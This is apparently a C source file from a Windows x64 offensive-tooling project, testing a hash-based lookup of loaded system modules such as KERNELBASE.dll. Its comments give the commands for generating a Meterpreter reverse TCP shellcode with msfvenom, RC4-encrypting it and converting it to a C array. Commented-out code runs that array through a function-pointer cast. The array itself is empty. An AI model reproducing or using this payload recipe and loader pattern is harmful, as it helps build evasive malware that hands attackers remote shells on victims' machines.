// system includes
#include <Windows.h>

// custom includes
#include "Helpers.h"

#define __cdecl CDECL

// 
// protect around 32 bit compilation
#ifdef _WIN64
#pragma intrinsic(__readgsqword)
#else 
#error "Hey, you cannot compile this program in x86 configuration"
#endif // _WIN64

// shellcode
// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=tun0 lport=14563 -f raw -o revtcp14563.bin
// cat revtcp14563.bin | openssl enc -rc4 -nosalt -k "GiveMeShell" > revtcp14563_enc.bin
// xxd -i revtcp14563_enc.bin
// 510 BYTES
// UCHAR SCODE_METERPRETER_REV_TCP_14563_ENC[] = { 0 };


INT
CDECL
main(VOID)
{
	// shellcode
	// int(*func)(VOID);
	// func = (int (*)(VOID))SCODE_METERPRETER_REV_TCP_14563_ENC;
	// (int)(*func)();

	DWORD dwLastError = ERROR_SUCCESS;
	UNICODE_STRING KernelBase = MY_RTL_CONSTANT_STRING(L"KERNELBASE.dll");
	//UNICODE_STRING K32 = MY_RTL_CONSTANT_STRING(L"kernel32.dll");
	ULONG KernelBaseHash = 0UL;

	//
	// make some hashes and dump them out
	//
	LdrpHashUnicodeString(&KernelBase, TRUE, 0UL, &KernelBaseHash);

	//
	// test different functionality of the API we made
	// to validate it works as intended
	// 
	//dwLastError = FindSystemModule(NULL, NULL);
	//dwLastError = FindSystemModule(&KernelBase, NULL);
	dwLastError = FindSystemModule(NULL, &KernelBaseHash);

	return dwLastError;
}